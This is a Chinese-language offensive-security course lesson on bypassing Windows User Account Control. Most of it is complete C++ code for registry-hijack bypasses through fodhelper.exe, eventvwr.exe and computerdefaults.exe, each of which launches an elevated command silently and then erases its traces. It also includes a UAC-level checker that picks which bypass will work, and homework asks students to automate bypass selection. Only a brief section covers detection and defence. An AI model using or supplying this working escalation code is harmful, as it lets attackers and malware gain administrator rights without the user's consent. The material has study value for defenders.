# 课时15：利用白名单绕过UAC

## 1. 课程目标

学习利用Windows UAC白名单机制绕过用户账户控制，实现静默提权。

### 1.1 学习目标

- 理解UAC的工作原理
- 了解UAC白名单机制
- 掌握常见的白名单绕过方法
- 实现自动提权工具

---

## 2. 名词解释

| 名词 | 英文 | 解释 |
|------|------|------|
| **UAC** | User Account Control | 用户账户控制，Windows权限提升机制 |
| **白名单** | Whitelist | 不需要UAC弹窗就能提权的程序列表 |
| **Auto-Elevate** | - | 自动提升权限，无需用户确认 |
| **Manifest** | - | PE文件中的权限声明 |
| **Integrity Level** | - | 完整性级别（Low/Medium/High/System）|
| **fodhelper.exe** | - | 常用的白名单程序之一 |
| **eventvwr.exe** | - | 事件查看器，白名单程序 |

---

## 3. UAC工作原理

### 3.1 UAC流程

```
程序请求管理员权限
        ↓
    检查Manifest
        ↓
  ┌─────────────────────────┐
  │  是否在白名单中?         │
  └─────────────────────────┘
        ↓              ↓
       是              否
        ↓              ↓
   自动提权       弹出UAC对话框
   (无弹窗)        (需用户确认)
```

### 3.2 白名单条件

程序满足以下条件可以自动提权：
1. 位于 `C:\Windows\System32` 目录
2. 具有微软签名
3. Manifest中声明 `autoElevate="true"`

### 3.3 常见白名单程序

| 程序 | 路径 | 利用方式 |
|------|------|----------|
| fodhelper.exe | System32 | 注册表劫持 |
| eventvwr.exe | System32 | 注册表劫持 |
| computerdefaults.exe | System32 | 注册表劫持 |
| sdclt.exe | System32 | 注册表劫持 |
| slui.exe | System32 | 文件劫持 |

---

## 4. 核心实现代码

### 4.1 fodhelper.exe绕过

```cpp
#include <windows.h>
#include <stdio.h>

// 使用fodhelper.exe绕过UAC
BOOL BypassUACViaFodhelper(LPCWSTR szCommand) {
    printf("[*] UAC绕过 - fodhelper.exe方法\n");
    printf("[*] 命令: %ws\n", szCommand);
    
    // 1. 创建注册表项
    // HKCU\Software\Classes\ms-settings\shell\open\command
    
    HKEY hKey;
    LSTATUS status;
    
    // 创建ms-settings类
    status = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL
    );
    
    if (status != ERROR_SUCCESS) {
        printf("[-] 创建注册表项失败: %d\n", status);
        return FALSE;
    }
    printf("[+] 注册表项创建成功\n");
    
    // 2. 设置默认值为我们的命令
    status = RegSetValueExW(
        hKey,
        NULL,  // 默认值
        0,
        REG_SZ,
        (LPBYTE)szCommand,
        (DWORD)(wcslen(szCommand) + 1) * sizeof(WCHAR)
    );
    
    if (status != ERROR_SUCCESS) {
        printf("[-] 设置命令失败: %d\n", status);
        RegCloseKey(hKey);
        return FALSE;
    }
    
    // 3. 设置DelegateExecute为空（必须）
    status = RegSetValueExW(
        hKey,
        L"DelegateExecute",
        0,
        REG_SZ,
        (LPBYTE)L"",
        sizeof(WCHAR)
    );
    
    RegCloseKey(hKey);
    printf("[+] 注册表配置完成\n");
    
    // 4. 启动fodhelper.exe触发提权
    printf("[*] 启动fodhelper.exe...\n");
    
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    
    if (!ShellExecuteExW(&sei)) {
        printf("[-] 启动fodhelper失败: %d\n", GetLastError());
        return FALSE;
    }
    
    // 等待一会让命令执行
    Sleep(2000);
    
    if (sei.hProcess) {
        CloseHandle(sei.hProcess);
    }
    
    // 5. 清理注册表
    printf("[*] 清理注册表...\n");
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
    
    printf("[+] UAC绕过完成!\n");
    return TRUE;
}

int main() {
    printf("========================================\n");
    printf("    UAC绕过 - fodhelper.exe\n");
    printf("========================================\n\n");
    
    // 启动一个提权的cmd
    BypassUACViaFodhelper(L"C:\\Windows\\System32\\cmd.exe");
    
    return 0;
}
```

### 4.2 eventvwr.exe绕过

```cpp
#include <windows.h>
#include <stdio.h>

// 使用eventvwr.exe绕过UAC
BOOL BypassUACViaEventvwr(LPCWSTR szCommand) {
    printf("[*] UAC绕过 - eventvwr.exe方法\n");
    
    HKEY hKey;
    LSTATUS status;
    
    // 创建mscfile类的shell\open\command
    status = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Classes\\mscfile\\shell\\open\\command",
        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL
    );
    
    if (status != ERROR_SUCCESS) {
        printf("[-] 创建注册表项失败\n");
        return FALSE;
    }
    
    // 设置命令
    RegSetValueExW(hKey, NULL, 0, REG_SZ, 
                   (LPBYTE)szCommand, 
                   (DWORD)(wcslen(szCommand) + 1) * sizeof(WCHAR));
    RegCloseKey(hKey);
    
    // 启动eventvwr.exe
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = L"eventvwr.exe";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);
    
    Sleep(2000);
    
    // 清理
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile");
    
    return TRUE;
}
```

### 4.3 computerdefaults.exe绕过

```cpp
#include <windows.h>
#include <stdio.h>

// 使用computerdefaults.exe绕过UAC
BOOL BypassUACViaComputerDefaults(LPCWSTR szCommand) {
    printf("[*] UAC绕过 - computerdefaults.exe方法\n");
    
    HKEY hKey;
    
    // 同样使用ms-settings协议
    RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL
    );
    
    RegSetValueExW(hKey, NULL, 0, REG_SZ,
                   (LPBYTE)szCommand,
                   (DWORD)(wcslen(szCommand) + 1) * sizeof(WCHAR));
    
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
                   (LPBYTE)L"", sizeof(WCHAR));
    
    RegCloseKey(hKey);
    
    // 启动computerdefaults.exe
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = L"C:\\Windows\\System32\\computerdefaults.exe";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);
    
    Sleep(2000);
    
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
    
    return TRUE;
}
```

### 4.4 检查UAC级别

```cpp
#include <windows.h>
#include <stdio.h>

// 检查UAC设置
void CheckUACLevel() {
    HKEY hKey;
    DWORD dwConsentPrompt = 0;
    DWORD dwSecureDesktop = 0;
    DWORD dwSize = sizeof(DWORD);
    
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        RegQueryValueExW(hKey, L"ConsentPromptBehaviorAdmin", NULL, NULL,
                        (LPBYTE)&dwConsentPrompt, &dwSize);
        RegQueryValueExW(hKey, L"PromptOnSecureDesktop", NULL, NULL,
                        (LPBYTE)&dwSecureDesktop, &dwSize);
        RegCloseKey(hKey);
    }
    
    printf("[*] UAC配置:\n");
    printf("    ConsentPromptBehaviorAdmin: %d\n", dwConsentPrompt);
    printf("    PromptOnSecureDesktop: %d\n", dwSecureDesktop);
    
    printf("    UAC级别: ");
    if (dwConsentPrompt == 0) {
        printf("从不通知 (最低)\n");
        printf("    [!] 可直接提权\n");
    } else if (dwConsentPrompt == 5 && dwSecureDesktop == 0) {
        printf("仅当应用尝试更改时通知 (无暗屏)\n");
        printf("    [+] 白名单绕过可用\n");
    } else if (dwConsentPrompt == 5 && dwSecureDesktop == 1) {
        printf("仅当应用尝试更改时通知 (默认)\n");
        printf("    [+] 白名单绕过可用\n");
    } else if (dwConsentPrompt == 2) {
        printf("始终通知 (最高)\n");
        printf("    [-] 需要其他方法\n");
    }
}

// 检查当前是否已提权
BOOL IsElevated() {
    BOOL bElevated = FALSE;
    HANDLE hToken = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            bElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    
    return bElevated;
}
```

---

## 5. 工作原理详解

### 5.1 fodhelper.exe劫持原理

```
1. fodhelper.exe是Windows"可选功能"程序
2. 它会查询注册表: HKCU\Software\Classes\ms-settings\shell\open\command
3. 如果存在，执行该命令（继承高权限）
4. 因为fodhelper.exe在白名单中，不会触发UAC
```

### 5.2 注册表劫持流程

```
正常流程:
fodhelper.exe → 查询HKCR\ms-settings → 执行默认处理程序

劫持后:
fodhelper.exe → 先查询HKCU\Software\Classes\ms-settings 
             → 发现我们的command → 执行我们的命令（带高权限）
```

---

## 6. 检测与防御

### 6.1 检测方法

| 方法 | 说明 |
|------|------|
| 注册表监控 | 监控HKCU\Software\Classes下的可疑修改 |
| 进程监控 | 检测白名单程序的异常子进程 |
| 行为分析 | 检测创建后立即删除的注册表项 |

### 6.2 防御措施

1. 将UAC设置为"始终通知"
2. 使用本地管理员以外的账户
3. 监控敏感注册表位置

---

## 7. 注意事项

1. **Windows版本差异**: 不同版本的Windows可能有不同的白名单
2. **安全软件检测**: 部分安全软件会检测这些技术
3. **UAC级别**: 如果UAC设置为"始终通知"，某些方法会失效
4. **日志记录**: 这些操作会被Windows事件日志记录

---

## 8. 课后作业

### 作业1：基础实现（必做）

1. 使用fodhelper.exe方法绕过UAC
2. 验证启动的cmd具有管理员权限

### 作业2：多方法测试（进阶）

1. 测试eventvwr.exe和computerdefaults.exe方法
2. 比较各方法的成功率

### 作业3：自动化工具（高级）

1. 编写工具自动检测UAC级别
2. 自动选择最佳绕过方法

---

## 9. 下一课预告

下一课我们将学习代码实现UAC绕过的其他方法，包括COM对象劫持等技术。
